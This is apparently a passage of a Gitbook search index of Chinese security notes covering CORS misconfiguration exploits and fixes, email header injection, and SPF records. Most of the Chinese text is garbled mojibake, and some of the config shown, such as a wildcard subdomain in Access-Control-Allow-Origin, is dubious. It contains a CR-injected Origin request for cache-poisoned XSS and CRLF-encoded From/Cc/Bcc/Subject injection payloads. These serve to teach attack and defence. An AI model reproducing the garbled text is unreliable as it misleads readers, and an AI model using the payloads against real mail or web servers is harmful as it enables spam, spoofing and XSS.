req.onload = reqListener; req.open('get','http://www.target.local/login',true); req.setRequestHeader('X-User', ''); req.send(); function reqListener() { location='http://www.target.local/login'; } æœåŠ¡å™¨ç«¯ç¼“å­˜ä¸­æ¯’ åˆ©ç”¨ CORS çš„é”™è¯¯é…ç½®æ³¨å…¥ä»»æ„ HTTP å¤´éƒ¨ï¼Œå°†å…¶ä¿å­˜åœ¨æœåŠ¡å™¨ç«¯ç¼“å­˜ä¸­ï¼Œå¯ç”¨äºæ„é€ å­˜å‚¨ç±»å‹ XSSã€‚ åˆ©ç”¨æ¡ä»¶ï¼šå­˜åœ¨æœåŠ¡å™¨ç«¯ç¼“å­˜ï¼Œèƒ½å¤Ÿåå°„ Origin å¤´éƒ¨ï¼Œä¸ä¼šæ£€æŸ¥ Origin å¤´éƒ¨ä¸­çš„ç‰¹æ®Šå­—ç¬¦ï¼Œå¦‚ \\r åˆ©ç”¨æ–¹å¼ï¼šæ”»å‡» IE / Edge ç”¨æˆ·ï¼ˆIE / Edge ä½¿ç”¨ \\r ä½œä¸ºçš„ HTTP æ ‡é¢˜æ®µçš„ç»ˆç»“ç¬¦ï¼‰ è¯·æ±‚åŒ… GET / HTTP/1.1 Origin: z[0x0d]Content-Type: text/html; charset=UTF-7 å›è½¦ï¼ˆCRï¼‰ï¼šASCII ç ï¼š'\\r' ï¼Œåå…­è¿›åˆ¶ï¼š0x0d å“åº”åŒ… HTTP/1.1 200 OK Access-Control-Allow-Origin: z Content-Type: text/html; charset=UTF-7 å¦‚æœæ”»å‡»è€…èƒ½æå‰å‘é€ç•¸å½¢çš„ Origin æ¶ˆæ¯å¤´ï¼Œåˆ™åˆ©ç”¨ä»£ç†æˆ–å‘½ä»¤è¡Œçš„æ–¹å¼å‘é€ï¼Œåˆ™æœåŠ¡å™¨å°±ä¼šç¼“å­˜è¿™æ ·çš„è¿”å›æŠ¥æ–‡å¹¶ä½œç”¨äºå…¶ä»–ç”¨æˆ·ã€‚ä¸Šä¾‹ä¸­ï¼Œæ”»å‡»è€…å°†é¡µé¢çš„ç¼–ç è®¾ç½®ä¸º UTF-7ï¼Œå¯å¼•å‘ XSS ä¸­æ–­ã€‚ é…åˆ XSS åŠ«æŒä¼šè¯ åœ¨æ­£å¸¸çš„ç½‘é¡µè¢«åµŒå…¥äº†åˆ°æ”»å‡»è€…æ§åˆ¶é¡µé¢çš„è·¨åŸŸè¯·æ±‚ï¼Œä»è€ŒåŠ«æŒç”¨æˆ·çš„ä¼šè¯ã€‚ äº¤äº’å¼ xssã€‚é€šè¿‡ corsï¼Œç»•è¿‡ä¸€äº›åä¼šè¯åŠ«æŒçš„æ–¹æ³•ï¼Œå¦‚ HTTP-Only é™åˆ¶çš„ cookieï¼Œç»‘å®š IP åœ°å€çš„ä¼šè¯ ID ç­‰ï¼ŒåŠ«æŒç”¨æˆ·ä¼šè¯ã€‚ ç¨‹åºçŒ¿åœ¨å†™ ajax è¯·æ±‚çš„æ—¶å€™ï¼Œå¯¹ç›®æ ‡åŸŸé™åˆ¶ä¸ä¸¥ï¼Œæœ‰ç‚¹ç±»ä¼¼äº url è·³è½¬ã€‚ facebook å‡ºç°è¿‡è¿™æ ·ä¸€ä¸ªæ¡ˆä¾‹ï¼Œjavascript é€šè¿‡ url é‡Œçš„å‚æ•°è¿›è¡Œ ajax è¯·æ±‚ã€‚ â€‹ 0x05 ä¿®å¤æ–¹æ³• ä¿®å¤æ–¹æ³•æ˜¯åˆç†é…ç½® CORSï¼Œåˆ¤æ–­ Origin æ˜¯å¦åˆæ³•ï¼›å…·ä½“è¯´å°±æ˜¯ä¸è®©åœ¨ nginx æˆ– tomcat ä¸­é…ç½®ã€Access-Control-Allow-Origin *â€‹â€‹â€‹â€‹â€‹ã€‘æˆ–ã€Access-Control-Allow-Origin nullâ€‹â€‹â€‹â€‹â€‹ã€‘ã€‚ å…³é—­éæ­£å¼å¼€å¯çš„ CORSï¼Œä¸è¦ä¿¡ä»»å…¨éƒ¨è‡ªèº«å­åŸŸï¼Œå‡å°‘æ”»å‡»é¢ ä¸è¦é…ç½® Access-Control-Allow-Originâ€‹â€‹â€‹ ä¸ºé€šé…ç¬¦ *â€‹â€‹â€‹ æˆ– nullâ€‹â€‹â€‹ï¼Œä¸¥æ ¼æ ¡éªŒæ¥è‡ªè¯·æ±‚æ•°æ®åŒ…ä¸­ Originâ€‹â€‹â€‹ çš„å€¼ å½»åº•çš„è¿”å› Vary: Originâ€‹â€‹â€‹ å³è¾¹ï¼Œçªç ´æ”»å‡»è€…åˆ©ç”¨æµè§ˆå™¨ç¼“å­˜è¿›è¡Œæ”»å‡» ä»…åœ¨æ¥æ”¶åˆ°è·¨åŸŸè¯·æ±‚æ—¶æ‰é…ç½®æœ‰å…³äºè·¨åŸŸçš„å¤´éƒ¨ï¼Œå¹¶ç¡®ä¿è·¨åŸŸè¯·æ±‚æ˜¯åˆæ³•çš„æºï¼Œä»¥å‡å°‘æ”»å‡»è€…æ¶æ„åˆ©ç”¨çš„å¯èƒ½æ€§ HTTPS ç½‘ç«™ä¸è¦ä¿¡ä»» HTTP åŸŸ # å…è®¸è·¨åŸŸè¯·æ±‚çš„åŸŸï¼Œ* ä»£è¡¨æ‰€æœ‰ï¼›null å¯ä»¥ç”¨æ¥å’Œæœ¬åœ° file é¡µé¢å…±äº«æ•°æ® add_header 'Access-Control-Allow-Origin' *; # å…è®¸è¯·æ±‚çš„ header add_header 'Access-Control-Allow-Headers' *; # å…è®¸å¸¦ä¸Š cookie è¯·æ±‚ï¼Œä¸èƒ½å’Œå…è®¸è·¨åŸŸè¯·æ±‚çš„åŸŸ * ä¸€åŒä½¿ç”¨ï¼ŒOrigin éœ€è¦æ˜ç¡®çš„é…ç½®å…è®¸æ¥æºçš„åŸŸã€‚å› ä¸º * è¿™ç§é…ç½®åªèƒ½ç”¨äºå…±äº«å…¬å¼€èµ„æºï¼Œå¯¹äºå…±äº«å…¬å¼€èµ„æºï¼Œä¸åº”è¯¥éœ€è¦èº«ä»½è®¤è¯ã€‚ add_header 'Access-Control-Allow-Credentials' 'true'; # å…è®¸è¯·æ±‚çš„æ–¹æ³•ï¼Œæ¯”å¦‚ GET,POST,PUT,DELETE add_header 'Access-Control-Allow-Methods' *; ä¿®æ”¹ Nginx é…ç½®æ–‡ä»¶ æ–¹æ³•ä¸€ï¼šä½¿ç”¨é€šé…ç¬¦ *â€‹â€‹ location / { add_header Access-Control-Allow-Origin *.xxx.com; add_header Access-Control-Allow-Headers \"Originï¼Œ X-Requested-With, Content-Type, Accept\"; add_header Access-Control-Allow-Methods \"GET, POST, OPTIONS\"; } æ–¹æ³•äºŒï¼šæŒ‡å®šåŸŸåç™½åå• æ ¹æ®é”™è¯¯é…ç½®ç±»å‹ï¼Œè¯¥æ–¹æ³•æœ‰å¾…ç¡®è®¤ã€‚ # ä½¿ç”¨åŸŸå location / { add_header Access-Control-Allow-Origin http://www.xixixi123.com; add_header Access-Control-Allow-Headers \"Originï¼Œ X-Requested-With, Content-Type, Accept\"; add_header Access-Control-Allow-Methods \"GET, POST, OPTIONS\"; } # æŒ‡å®š ip ä¸ç«¯å£ï¼Œå¯ä»¥é€—å·æ‹¼æ¥ location / { add_header Access-Control-Allow-Origin http://10.130.222.222:6500,http://10.130.222.223:6500; add_header Access-Control-Allow-Headers \"Originï¼Œ X-Requested-With, Content-Type, Accept\"; add_header Access-Control-Allow-Methods \"GET, POST, OPTIONS\"; } æ–¹æ³•ä¸‰ï¼šä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼ location ~ /myurl(.*) { if ( $http_origin ~ '^http(s)?://(localhost|10\\.130\\.222\\.222):6500$' { add_header Access-Control-Allow-Origin $http_origin; } if ( $http_origin ~ '^http(s)?://(localhost|10\\.130\\.222\\.223):6500$' { add_header Access-Control-Allow-Origin $http_origin; } add_header Access-Control-Allow-Headers \"Originï¼Œ X-Requested-With, Content-Type, Accept\"; add_header Access-Control-Allow-Methods \"GET, POST, OPTIONS\"; } è¯´æ˜ â€‹$ http_originâ€‹â€‹ å¯ä»¥è·å–åˆ°è¯·æ±‚å¤´ä¸­çš„ Origin å­—æ®µï¼›ä½†æ˜¯å¦‚æœè¯·æ±‚å¤´æ²¡æœ‰ï¼Œå°±è·å–ä¸åˆ°äº†ï¼› â€‹^â€‹â€‹ æ˜¯æ­£åˆ™è¡¨è¾¾å¼ï¼Œè¡¨ç¤ºå¼€å¤´ä½ç½®ï¼›$â€‹â€‹ æ˜¯æ­£åˆ™è¡¨è¾¾å¼ï¼Œè¡¨ç¤ºç»“å°¾ä½ç½® â€‹?â€‹â€‹ æ˜¯æ­£åˆ™è¡¨è¾¾å¼ï¼Œè¡¨ç¤º s å¯èƒ½æœ‰ï¼Œä¹Ÿå¯èƒ½æ²¡æœ‰ï¼Œè¿™ä¸¤ç§æƒ…å†µéƒ½å¯ä»¥åŒ¹é… .â€‹â€‹â€‹ æ˜¯æŠŠ .â€‹â€‹ è½¬ä¹‰æˆæ™®é€šå­—ç¬¦çš„æ„æ€ nginx ä¸­ï¼Œif åå¿…é¡»åŠ ç©ºæ ¼ï¼Œç„¶åæ‰èƒ½å†™ (â€‹â€‹ï¼Œå¦åˆ™ä¼šæŠ¥é”™ï¼›nginx ä¸­ï¼Œæ²¡æœ‰ else if nginx è§£å†³å¤æ‚è¯·æ±‚è·¨åŸŸçš„æ—¶å€™éœ€åŠ ä¸Š aways å‚æ•°egï¼šadd_header 'Access-Control-Allow-Origin' \"$http_origin\" always;â€‹â€‹ åŸå› ï¼šAs of Nginx 1.7.5, add_header supports an \"always\" parameter whichâ€‹allows CORS to work if the backend returns 4xx or 5xx status code.â€‹â€‹å‚è€ƒèµ„æ–™ï¼šhttps://gist.github.com/Stanback/7145487 ç™½åå•é…ç½®ç¤ºä¾‹ Tomcat è¿‡æ»¤è·¯ç”± package filter; import java.io.IOException; import java.io.UnsupportedEncodingException; import java.security.MessageDigest; import java.security.NoSuchAlgorithmException; import java.util.Arrays; import javax.servlet.Filter; import javax.servlet.FilterChain; import javax.servlet.FilterConfig; import javax.servlet.ServletException; import javax.servlet.ServletRequest; import javax.servlet.ServletResponse; import javax.servlet.annotation.WebFilter; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import javax.xml.ws.http.HTTPException; @WebFilter(\"/Cors\") public class CorsFilter implements Filter { /** * Default constructor. */ public FilterConfig config; public CorsFilter() { // TODO Auto-generated constructor stub } /** * @see Filter#destroy() */ public void destroy() { // TODO Auto-generated method stub this.config = null; } /** * @see Filter#doFilter(ServletRequest, ServletResponse, FilterChain) */ public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException { //é…ç½®å¯ä¿¡åŸŸå String[] authhosts = {\"http://www.abc.com:8008\", \"http://www.abcyy.com\"}; String authost = \"\"; HttpServletRequest httprequest = (HttpServletRequest) request; String origin = httprequest.getHeader(\"origin\"); HttpServletResponse httpresponse = (HttpServletResponse) response; if (origin != null && !Arrays.asList(authhosts).contains(origin)) { httpresponse.sendError(403); return; } else { for (int i = 0; i å¦ä¸€ç§é…ç½®æ–¹å¼ æŠŠ cors-filter-1.7.jar ä¸ java-property-utils-1.9.jar è¿™ä¸¤ä¸ªæ–‡ä»¶æ”¾åˆ° tomcat çš„ lib ç›®å½•ä¸‹ åœ¨ tomcat çš„ web.xml ä¸­é…ç½® CORS com.thetransactioncompany.cors.CORSFilter cors.allowOrigin * --> *.xxx.com,http://10.130.222.222:6500 cors.exposedHeaders Set-Cookie cors.supportsCredentials true CORS /* 0x00 å‰äººæ ½æ ‘ è·¨åŸŸèµ„æºå…±äº« CORS è¯¦è§£ - é˜®ä¸€å³°çš„ç½‘ç»œæ—¥å¿— (ruanyifeng.com) -- å¯ä»¥é¡ºä¾¿çœ‹çœ‹è¯„è®º ç»•è¿‡æµè§ˆå™¨ SOPï¼Œè·¨ç«™çªƒå–ä¿¡æ¯ï¼šCORS é…ç½®å®‰å…¨æ¼æ´æŠ¥å‘ŠåŠæœ€ä½³éƒ¨ç½²å®è·µ | Jianjun Chen | International Computer Science Institute | Network Security -- æ¨èé˜…è¯» https://web.dev/cross-origin-resource-sharing/ https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS CVE-2018-8014ï¼Œhttps://nvd.nist.gov/vuln/detail/CVE-2018-8014 nginx - å‰ç«¯å¸¸è§è·¨åŸŸè§£å†³æ–¹æ¡ˆï¼ˆå…¨ï¼‰ - ä¸ªäººæ–‡ç«  - SegmentFault æ€å¦ CORS ä»‹ç»åŠå…¶æ¼æ´æ£€æµ‹ - çŸ¥ä¹ (zhihu.com) CORS è·¨åŸŸæ¼æ´ä¿®å¤ - ä¸æ„¿é€éœ²å§“åçš„æ±¤å§†çŒ« - åšå®¢å›­ (cnblogs.com) (82 æ¡æ¶ˆæ¯) CORS(è·¨åŸŸèµ„æºå…±äº«)æ¼æ´è§£å†³æ–¹æ³•cors æ¼æ´ä¿®å¤è¿½é€æ¢¦æƒ³æ°¸ä¸åœçš„åšå®¢-CSDN åšå®¢ -- æµ‹è¯•æ–¹æ³•è¯´æ˜æœ‰è¯¯ ã€æ¼æ´åˆ©ç”¨ã€‘è·¨åŸŸèµ„æºå…±äº«ï¼ˆCORSï¼‰æ¼æ´è¯¦è§£ - GorillaLee - åšå®¢å›­ (cnblogs.com) CORS å®Œå…¨æ‰‹å†Šï¼ˆä¸€ï¼‰ï¼šç‚ºä»€éº¼æœƒç™¼ç”Ÿ CORS éŒ¯èª¤ï¼Ÿ Â· Issue #68 Â· aszx87410/blog Â· GitHub (82 æ¡æ¶ˆæ¯) Nginx è·¨åŸŸé…ç½®_ç¨‹åºå‘˜å°å¼ºçš„åšå®¢-CSDN åšå®¢ https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest/withCredentials Copyright & Copy zha0cai all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ä»¶ä¿®è®¢æ—¶é—´ï¼š 2023-05-14 18:29:10 "},"email/readme.html":{"url":"email/readme.html","title":"Email","keywords":"","body":"å…³äºé‚®ä»¶çš„çŸ¥è¯†åˆé›†~ Copyright & Copy zha0cai all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ä»¶ä¿®è®¢æ—¶é—´ï¼š 2023-05-14 19:28:32 "},"email/Attack Email.html":{"url":"email/Attack Email.html","title":"Attack Email","keywords":"","body":"é‚®ä»¶å­—æ®µ åŸŸå å«ä¹‰ æ·»åŠ è€… Received ä¼ è¾“è·¯å¾„ å„çº§é‚®ä»¶æœåŠ¡å™¨ Return-Path å›å¤åœ°å€ ç›®æ ‡é‚®ä»¶æœåŠ¡å™¨ Delivered-To å‘é€åœ°å€ ç›®æ ‡é‚®ä»¶æœåŠ¡å™¨ Reply-To å›å¤åœ°å€ é‚®ä»¶çš„åˆ›å»ºè€… From å‘ä»¶äººåœ°å€ é‚®ä»¶çš„åˆ›å»ºè€… To æ”¶ä»¶äººåœ°å€ é‚®ä»¶çš„åˆ›å»ºè€… Cc æŠ„é€åœ°å€ é‚®ä»¶çš„åˆ›å»ºè€… Bcc æš—é€åœ°å€ é‚®ä»¶çš„åˆ›å»ºè€… Date æ—¥æœŸå’Œæ—¶é—´ é‚®ä»¶çš„åˆ›å»ºè€… Subject ä¸»é¢˜ é‚®ä»¶çš„åˆ›å»ºè€… Message-ID æ¶ˆæ¯ID é‚®ä»¶çš„åˆ›å»ºè€… MIME-Version MIMEç‰ˆæœ¬ é‚®ä»¶çš„åˆ›å»ºè€… Content-Type å†…å®¹çš„ç±»å‹ é‚®ä»¶çš„åˆ›å»ºè€… Content-Transfer-Encoding å†…å®¹çš„ä¼ è¾“ç¼–ç æ–¹å¼ é‚®ä»¶çš„åˆ›å»ºè€… é‚®ä»¶æ³¨å…¥ é‚®ä»¶æ³¨å…¥å’Œ HTTP å¤´éƒ¨æ³¨å…¥ç›¸ä¼¼ï¼Œè¿™ç§æ¼æ´å‘ç”Ÿåœ¨ä¸€ä¸ªç¼–ç¨‹è¯­è¨€åµŒå…¥å¦ä¸€ä¸ªï¼Œæ¯”å¦‚ mysql åµŒå…¥phpã€‚ å¯¹äºé‚®ä»¶å¤´éƒ¨çš„å­—æ®µå…¶å®å°±æ˜¯æ¢è¡Œç¬¦ 0x0A æˆ–è€… 0x0D0x0A åˆ†å‰² ï¼Œåœ¨ç»å¤§éƒ¨åˆ†ç³»ç»Ÿé‡Œé¢ä¸æ˜¯ \\n å°±æ˜¯ \\r\\nï¼Œæ‰€ä»¥å°±å¯ä»¥æ³¨å…¥äº†ã€‚ ç”µå­é‚®ä»¶æ³¨å…¥æ˜¯é’ˆå¯¹é‚®ä»¶åŠŸèƒ½çš„ä¸€ç§æ”»å‡»ç±»å‹ã€‚å®ƒå…è®¸æ¶æ„æ”»å‡»è€…æ³¨å…¥ä»»ä½•é‚®ä»¶å¤´å­—æ®µï¼ŒBCCã€CCã€ä¸»é¢˜ç­‰ï¼Œå®ƒå…è®¸é»‘å®¢é€šè¿‡æ³¨å…¥æ‰‹æ®µä»å—å®³è€…çš„é‚®ä»¶æœåŠ¡å™¨å‘é€åƒåœ¾é‚®ä»¶ã€‚å®ƒå¯èƒ½ä¼šå½±å“ä»»ä½•ä»ç”¨æˆ· UI æ¥æ”¶æ¶ˆæ¯å¹¶å‘é€ç”µå­é‚®ä»¶æ¶ˆæ¯çš„åº”ç”¨ç¨‹åºã€‚è¿™ç§æ”»å‡»çš„ä¸»è¦åŸå› æ˜¯ä¸é€‚å½“çš„ç”¨æˆ·è¾“å…¥éªŒè¯æˆ–åº”ç”¨ç¨‹åºæ ¹æœ¬æ²¡æœ‰éªŒè¯å’Œè¿‡æ»¤æœºåˆ¶ã€‚ æ³¨å…¥åˆ†ç±» å‘ä»¶äººï¼Œä¸»é¢˜ï¼Œå†…å®¹ å‘ä»¶äººä¿®æ”¹ æœ¬æ¥å‘ä»¶äººå°±å¯æ§ï¼Œæˆ–è€…åœ¨åˆ«çš„å­—æ®µé‡Œé‡å¤æ·»åŠ ï¼Œä½†æ˜¯è¦çœ‹é‚®ä»¶æœåŠ¡å™¨é’ˆå¯¹å¤šä¸ª from æ˜¯å¦‚ä½•å®ç°çš„ï¼Œæ˜¯å–ç¬¬ä¸€ä¸ªï¼Œè¿˜æ˜¯å–æœ€åä¸€ä¸ªï¼Œè¿˜æ˜¯å¦‚ä½•æ“ä½œã€‚ from:sender@domain.com%0Afrom:attacker@domain.com æ”¶ä»¶äººã€æŠ„é€äººæ³¨å…¥ï¼ˆCc/Bccæ³¨å…¥ï¼‰ åœ¨å‘é€è€…å­—æ®µ(sender)åæ³¨å…¥ Cc å’Œ Bcc å‚æ•° From:sender@domain.com%0ACc:recipient@domain.com%0ABcc:recipient1@domain.com æ‰€ä»¥ç°åœ¨ï¼Œæ¶ˆæ¯å°†è¢«å‘é€åˆ° recipient å’Œ recipient1 è´¦æˆ·ã€‚ ä¸»é¢˜æ³¨å…¥ æ”»å‡»è€…æ³¨å…¥çš„å‡çš„ä¸»é¢˜ subject å°†è¢«æ·»åŠ åˆ°åŸæ¥çš„ä¸»é¢˜ä¸­å¹¶ä¸”åœ¨æŸäº›æƒ…å†µä¸‹å°†å–ä»£åŸæœ¬çš„ä¸»é¢˜ subjectï¼Œè¿™å–å†³äºé‚®ä»¶æœåŠ¡è¡Œä¸ºã€‚å³ä»£ç ç¼–å†™çš„å®¹é”™æ€§ï¼Œå½“å‚æ•°ä¸­å‡ºç°ä¸¤ä¸ª subject çš„æ—¶å€™ä»£ç æ˜¯é€‰æ‹©ä¸¢å¼ƒè¿˜æ˜¯åè€…è¦†ç›–ã€‚ From:sender@domain.com%0ASubject:Thisâ€™s%20Fake%20Subject æ¶ˆæ¯ä½“æ³¨å…¥ è¦æ³¨æ„ SMTP çš„ Mail æ ¼å¼ï¼Œæ¶ˆæ¯ä¸»é¢˜å’Œå¤´éƒ¨ Header ä¹‹é—´æœ‰ä¸¤ä¸ªæ¢è¡Œç¬¦(å’Œ HTTP æ˜¯ä¸€æ ·çš„)ã€‚ From:sender@domain.com%0A%0AMy%20New%20%0Fake%20Message. å‡æ¶ˆæ¯å°†è¢«æ·»åŠ åˆ°åŸå§‹æ¶ˆæ¯ä¸­ã€‚ 0x00 å‰äººæ ½æ ‘ é‚®ä»¶æ³¨å…¥æ”»å‡» Copyright & Copy zha0cai all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ä»¶ä¿®è®¢æ—¶é—´ï¼š 2023-05-08 14:20:17 "},"email/é‚®ä»¶åè®®.html":{"url":"email/é‚®ä»¶åè®®.html","title":"é‚®ä»¶åè®®","keywords":"","body":"MIME é‚®ä»¶æ ¼å¼ SPF What is SPF (Sender Policy Framework) çš„ç¼©å†™ï¼Œä¸€ç§ä»¥ IP åœ°å€è®¤è¯ç”µå­é‚®ä»¶å‘ä»¶äººèº«ä»½çš„æŠ€æœ¯ï¼Œæ˜¯éå¸¸é«˜æ•ˆçš„åƒåœ¾é‚®ä»¶è§£å†³æ–¹æ¡ˆã€‚ æ¥æ”¶é‚®ä»¶æ–¹ä¼šé¦–å…ˆæ£€æŸ¥åŸŸåçš„ SPF è®°å½•ï¼Œæ¥ç¡®å®šå‘ä»¶äººçš„ IP åœ°å€æ˜¯å¦è¢«åŒ…å«åœ¨SPFè®°å½•é‡Œé¢ï¼Œå¦‚æœåœ¨ï¼Œå°±è®¤ä¸ºæ˜¯ä¸€å°æ­£ç¡®çš„é‚®ä»¶ï¼Œå¦åˆ™ä¼šè®¤ä¸ºæ˜¯ä¸€å°ä¼ªé€ çš„é‚®ä»¶è¿›è¡Œé€€å›ã€‚ å€ŸåŠ© SPF é˜²èŒƒä»¿å†’é‚®ä»¶å’Œåƒåœ¾é‚®ä»¶ ä»€ä¹ˆæ˜¯ DNS SPF è®°å½•ï¼Ÿ SPF è®°å½•æ˜¯ä»€ä¹ˆä»¥åŠå®ƒå¦‚ä½•å·¥ä½œï¼šSPF è®°å½•å…¨è§£é‡Š SPF è®°å½•æ˜¯ä»€ä¹ˆæ ·çš„ï¼Ÿ å®˜æ–¹ SPF è®°å½•æ–‡æ¡£ SPF è®°å½•å¿…é¡»éµå¾ªä¸€å®šçš„æ ‡å‡†ï¼Œä»¥ä¾¿æœåŠ¡å™¨ç†è§£å…¶å†…å®¹ã€‚å¦‚ä¸‹æ˜¯ SPF è®°å½•æ ¸å¿ƒç»„æˆéƒ¨åˆ†çš„ç¤ºä¾‹ï¼š v=spf1 ip4=192.0.2.0 ip4=192.0.2.1 include:examplesender.email -all è¿™ä¸ªä¾‹å­è®©æœåŠ¡å™¨çŸ¥é“è¿™æ˜¯ä»€ä¹ˆç±»å‹çš„è®°å½•ï¼Œå£°æ˜å¯¹è¿™ä¸ªåŸŸè¢«æ‰¹å‡†çš„ IP åœ°å€å’Œç¬¬ä¸‰æ–¹ï¼Œå¹¶å‘ŠçŸ¥æœåŠ¡å™¨å¦‚ä½•å¤„ç†ä¸ç¬¦åˆè¦æ±‚çš„ç”µå­é‚®ä»¶ã€‚æˆ‘ä»¬åˆ†åˆ«è¯´æ˜å„ç»„æˆéƒ¨åˆ†æ˜¯å¦‚ä½•å®ç°è¿™ä¸€ç‚¹çš„ï¼š v=spf1 å‘Šè¯‰æœåŠ¡å™¨è¿™é‡ŒåŒ…å«ä¸€æ¡ SPF è®°å½•ã€‚æ¯ä¸€æ¡ SPF è®°å½•éƒ½å¿…é¡»ä»¥è¿™ä¸ªå­—ç¬¦ä¸²å¼€å§‹ã€‚ ç„¶åæ˜¯ SPF è®°å½•çš„â€œå®¢äººåå•â€éƒ¨åˆ†ï¼Œå³æˆæƒ IP åœ°å€ã€‚åœ¨æœ¬ä¾‹ä¸­ï¼ŒSPF è®°å½•å‘Šè¯‰æœåŠ¡å™¨ï¼Œip4=192.0.2.0 å’Œ ip4=192.0.2.1 è¢«æˆæƒä»£è¡¨è¯¥åŸŸå‘é€ç”µå­é‚®ä»¶ã€‚ include:examplesender.net æ˜¯ â€œincludeâ€ï¼ˆåŒ…å«ï¼‰æ ‡è®°çš„ç¤ºä¾‹ï¼Œè¯¥æ ‡è®°å‘Šè¯‰æœåŠ¡å™¨ï¼Œæœ‰å“ªäº›ç¬¬ä¸‰æ–¹ç»„ç»‡è¢«æˆæƒä»£è¡¨è¯¥åŸŸå‘é€ç”µå­é‚®ä»¶ã€‚è¿™ä¸ªæ ‡è®°è¡¨ç¤ºï¼Œè¢«åŒ…å«åŸŸï¼ˆexamplesender.netï¼‰çš„ SPF è®°å½•å†…å®¹åº”è¢«æ£€æŸ¥ï¼Œå…¶ä¸­åŒ…å«çš„ IP åœ°å€ä¹Ÿåº”è¢«è§†ä¸ºå·²æˆæƒã€‚ä¸€æ¡ SPF è®°å½•ä¸­å¯åŒ…å«å¤šä¸ªåŸŸï¼Œä½†è¿™ä¸ªæ ‡è®°ä»…é€‚ç”¨äºæœ‰æ•ˆçš„åŸŸã€‚ Finally, -all å‘Šè¯‰æœåŠ¡å™¨ï¼ŒSPF è®°å½•ä¸­æœªåˆ—å‡ºçš„åœ°å€æ²¡æœ‰è¢«æˆæƒå‘é€ç”µå­é‚®ä»¶å¹¶åº”è¢«æ‹’ç»ã€‚ è¿™é‡Œçš„å…¶ä»–å¯é€‰é¡¹åŒ…æ‹¬ ~allï¼šè¡¨ç¤ºæœªåˆ—å‡ºçš„ç”µå­é‚®ä»¶å°†è¢«æ ‡è®°ä¸ºä¸å®‰å…¨é‚®ä»¶æˆ–åƒåœ¾é‚®ä»¶ï¼Œä½†ä»ä¼šè¢«æ¥å—ï¼›ä¸é‚£ä¹ˆå¸¸è§çš„æ˜¯ +allï¼šè¡¨ç¤ºä»»ä½•æœåŠ¡å™¨éƒ½å¯ä»¥ä»£è¡¨è¯¥åŸŸå‘é€ç”µå­é‚®ä»¶ã€‚ SPF Record evaluation é‚®ä»¶æœåŠ¡å™¨ä¸­çš„ SPF æ¨¡å—åœ¨å¯¹ SPF è®°å½•ä¸­çš„ terms è¿›è¡Œä¼°å€¼åï¼Œå‘é‚®ä»¶æœåŠ¡å™¨è¿”å›è®¤è¯ (authentication) ç»“æœã€‚ SPF ä¸­æœ‰ 2 ç§ termsï¼šmechanisms ä»¥åŠ modifiersã€‚ SPF è®¤è¯ç»“æœä¸ºä»¥ä¸‹å…¶ä¸­ä¹‹ä¸€ï¼š None: æœªèƒ½æœ‰æ•ˆåœ°è§£é‡ŠåŸŸåï¼Œæˆ–è€…åŸŸåä¸Šæœªæ‰¾åˆ° SPF è®°å½•ï¼› Neutral: å‘èµ·è¯·æ±‚çš„ä¸»æœºçš„ IP åœ°å€æ˜¯å¦å…è®¸å¹¶æœªç¡®å®šï¼› Pass: å‘èµ·è¯·æ±‚çš„ä¸»æœºçš„ IP åœ°å€è¢«å…è®¸ï¼› Fail: å‘èµ·è¯·æ±‚çš„ä¸»æœºçš„ IP åœ°å€ä¸è¢«å…è®¸ï¼› Softfail: å‘èµ·è¯·æ±‚çš„ä¸»æœºçš„ IP åœ°å€å¯èƒ½ä¸è¢«å…è®¸ï¼› Temperror: SPF æ¨¡å—åœ¨æ£€æŸ¥æ—¶ç¢°åˆ°ä¸´æ—¶ç½‘ç»œé”™è¯¯ï¼› Permerror: åŸŸåä¸Šå‘å¸ƒçš„ SPF æ— æ³•è§£é‡Šã€‚è¿™ç§æƒ…å†µï¼ŒåŸŸåç®¡ç†å‘˜é¡»ä¿®å¤æ­¤é”™è¯¯ã€‚ å¦‚æœä¸€ç›´åˆ° SPF è®°å½•çš„æœ«å°¾éƒ½æ²¡æœ‰æ‰¾åˆ°åŒ¹é…ï¼Œè¿”å› neutralã€‚è¿™æ˜¯ SPF ä¼°å€¼çš„ç¼ºçœå€¼ã€‚ SPF qualifiers SPF qualifier å‰ç½®äº SPF mechanismï¼Œç”¨æ¥æŒ‡å®šè¯¥ SPF mechanism çš„ä¼°å€¼ç»“æœã€‚ä»¥ä¸‹æ˜¯æ‰€æœ‰çš„ qualifiersï¼Œä»¥åŠå¯¹åº”çš„ç»“æœï¼š \"+\" pass \"-\" fail \"~\" softfail \"?\" neutral SPF mechanisms æœ‰ä¸¤ç§ SPF mechanismsï¼šåŸºæœ¬ mechanisms å’ŒæŒ‡å®šå‘é€è€… mechanismsã€‚ åŸºæœ¬ mechanisms æœ‰ all å’Œ includeã€‚ æŒ‡å®šå‘é€è€… mechanisms æœ‰ aï¼Œmxï¼Œptrï¼Œip4ï¼Œip6ï¼Œå’Œ existsã€‚ include å¯ä»¥è®© SPF è®°å½•æŠŠå®šä¹‰åœ¨å¦å¤–ä¸€ä¸ª SPF è®°å½•ä¸­çš„ç¬¬ä¸‰æ–¹ IP åœ°å€åŒ…æ‹¬è¿›æ¥ã€‚ è¦ç¡®ä¿ SPF è®°å½•æœ‰æ•ˆï¼Œéœ€è¦æ³¨æ„å¦‚ä¸‹å‡ ç‚¹ï¼š æ¯ä¸ªåŸŸä¸èƒ½å…³è”å¤šæ¡ SPF è®°å½•ã€‚ è®°å½•å¿…é¡»ä»¥ all éƒ¨åˆ†ç»“æŸï¼Œæˆ–åŒ…å«ä¸€ä¸ª redirect: éƒ¨åˆ†ï¼ˆè¡¨ç¤ºè¯¥ SPF è®°å½•ç”±å¦ä¸€ä¸ªåŸŸæ‰˜ç®¡ï¼‰ã€‚ SPF è®°å½•ä¸èƒ½åŒ…å«å¤§å†™å­—æ¯ã€‚ SPF modifiers SPF æœ‰ä¸¤ä¸ª modifiersï¼šredirect å’Œ expã€‚ SPF modifiers æ˜¯å¯é€‰çš„ã€‚ æ¯æ¡ SPF record ä¸­çš„ä»»ä½• SPF modifier åªèƒ½å¤Ÿä½¿ç”¨ä¸€æ¬¡ã€‚ æœªçŸ¥çš„ 